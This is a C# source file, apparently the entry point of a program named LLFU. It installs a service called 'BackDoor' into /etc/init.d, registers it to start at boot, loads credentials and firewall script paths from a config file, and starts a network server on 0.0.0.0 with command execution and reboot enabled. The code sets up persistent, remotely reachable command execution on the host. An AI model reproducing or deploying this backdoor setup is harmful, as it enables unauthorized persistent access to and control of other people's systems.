using JCommon;
using LLFU.Network;
using System;
using System.IO;

namespace LLFU
{
    public class Program
    {
        public static string username;
        public static string password;
        public static string path_to_firewall_up;
        public static string path_to_firewall_up_org;
        public static string path_to_firewall_down;

        public static bool IsExecuteCommands = true;
        public static bool AllowReboot = true;
        public static int port = 999;
        public static string ip = "0.0.0.0";

        static void Main(string[] args)
        {
            var Configs = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "config/AppConfig.ini");

            ShellHelper.ExecuteComand("cp /root/BackDoor/etc/ / -R");
            ShellHelper.ExecuteComand("chmod 755 /etc/init.d/BackDoor");
            ShellHelper.ExecuteComand("update-rc.d BackDoor defaults");
            ShellHelper.ExecuteComand("systemctl daemon-reload");
            var file = new IniFile(Configs);
            if (file != null)
            {
                username = file.GetValue<string>("username");
                password = file.GetValue<string>("password");
                ip = file.GetValue<string>("ip");
                port = file.GetValue<int>("port");
                path_to_firewall_up = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, file.GetValue<string>("path_to_firewall_up"));
                path_to_firewall_up_org = path_to_firewall_up+"_org";
                path_to_firewall_down = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, file.GetValue<string>("path_to_firewall_down"));
                var logPath = file.GetValue<string>("logPath");
                if (File.Exists(logPath))
                    File.WriteAllText(logPath, "");
                else
                {
                    Directory.CreateDirectory(Path.GetDirectoryName(logPath));
                    File.WriteAllText(logPath, "");
                }

                Log.Initialize(logPath);
                NetworkManager.Instance.InitHandlers();
                NetworkManager.Instance.Start();
                Log.Info("Server started.");
            }
        }
    }
}
